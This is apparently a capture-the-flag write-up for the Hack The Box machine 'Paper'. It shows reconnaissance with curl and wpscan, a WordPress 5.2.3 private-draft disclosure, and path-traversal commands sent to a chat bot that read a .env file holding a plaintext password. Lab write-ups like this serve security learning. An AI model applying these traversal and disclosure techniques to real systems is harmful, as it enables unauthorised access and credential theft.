# Paper

# Finding backend server

````shell
# curl -I http://10.10.11.143
HTTP/1.1 403 Forbidden
Date: Thu, 24 Feb 2022 00:50:52 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
ETag: "30c0b-5c5c7fdeec240"
Accept-Ranges: bytes
Content-Length: 199691
Content-Type: text/html; charset=UTF-8
````
`office.paper`

Add office.paper `/etc/paper`

`http://office.paper/wp-login.php`

````shell
wpscan --url http://office.paper/wp-login.php
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05)
````

## [WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts](https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2)


Access the site returns 404, but after removing &order=asc we have a thing
````
> http://wordpress.local/?static=1&order=asc 
````

````
> http://wordpress.local/?static=1



test

Micheal please remove the secret from drafts for gods sake!

Hello employees of Blunder Tiffin,

Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.

So, I kindly request you all to take your discussions from the public blog to a more private chat system.

-Nick

# Warning for Michael

Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

Threat Level Midnight

A MOTION PICTURE SCREENPLAY,
WRITTEN AND DIRECTED BY
MICHAEL SCOTT

[INT:DAY]

Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!
````

Register your user then access the general chat


> DwightKSchrute 6:30 AM Receptionitis15 Just call the bot by his name and say help. His name is recyclops. For eg: sending "recyclops help" will spawn the bot and he'll tell you what you can and cannot ask him. Now stop wasting my time PAM! I've got work to do! 

Send direct message to `recyclops`

````
help
````

````
list ../
````

Enumerating files, we got to `file ../hubot/.env`
````
<!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====Contents of file ../hubot/.env=====>
````



